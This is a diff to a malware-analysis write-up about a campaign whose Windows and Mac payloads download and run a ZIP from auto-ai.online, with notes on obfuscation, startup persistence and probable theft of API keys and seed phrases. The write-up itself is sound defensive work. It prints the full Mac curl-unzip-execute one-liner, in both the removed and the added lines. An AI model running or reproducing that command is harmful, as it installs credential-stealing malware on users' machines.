@@ -162,13 +162,13 @@ The code is heavily obfuscated with lots of redundancies and nonsensical variabl
 
 ### Windows Payload
 
-The malicious command that gets executed on Windows systems:
+The command that gets executed on Windows systems:
 
 1. Downloads a malicious ZIP file from `auto-ai.online/cam-v-257.fix`
 2. Extracts it to the Windows temp directory
 3. Executes a VBS script (`update.vbs`) that contains the actual malware payload
 
-I loaded a VM and downloaded the malicious payload. A screenshot of the zip file's content is below:
+I loaded a VM and downloaded the payload. A screenshot of the zip file's content is below:
 
 ![here](./screenshots/fixed.zip.png)
 
@@ -179,16 +179,15 @@ I loaded a VM and downloaded the malicious payload. A screenshot of the zip file
 3. **Obfuscation:** Uses string concatenation to hide commands (`"ch" & "ost.exe"`)
 4. **Stealth:** Runs commands with hidden windows (`0` parameter)
 
-There's a couple compiled binaries in there which is safe to assume are likely looking for anything to get their hands one, e.g. API keys, seed phrases, etc.
+I looked at the python code, and they're putting in registry entries to start the binaries at startup, so this attack will be scanning the system continuously for anything of value.
 
-I looked at the python code, and they're putting in registry entries to start the binaries at startup, so this is malicious payload will be scanning the system continuously for anything of value.
+There's a couple compiled binaries in there which is safe to assume are likely looking for anything to get their hands one, e.g. API keys, seed phrases, banking information, etc.
+
 
 ### Mac Payload
 
 The malicious command that gets executed on Mac systems:
 
-```bash
-curl -k -o "/tmp/fixed.zip" "https://auto-ai.online/cam-v-257.fix" && unzip -o "/tmp/fixed.zip" -d "/tmp/fixed" && chmod +x "/tmp/fixed/update.sh" && "/tmp/fixed/update.sh"
-```
+`curl -k -o "/tmp/fixed.zip" "https://auto-ai.online/cam-v-257.fix" && unzip -o "/tmp/fixed.zip" -d "/tmp/fixed" && chmod +x "/tmp/fixed/update.sh" && "/tmp/fixed/update.sh"`
 
 I didn't download the Mac payload but safe to assume it operates similarly.
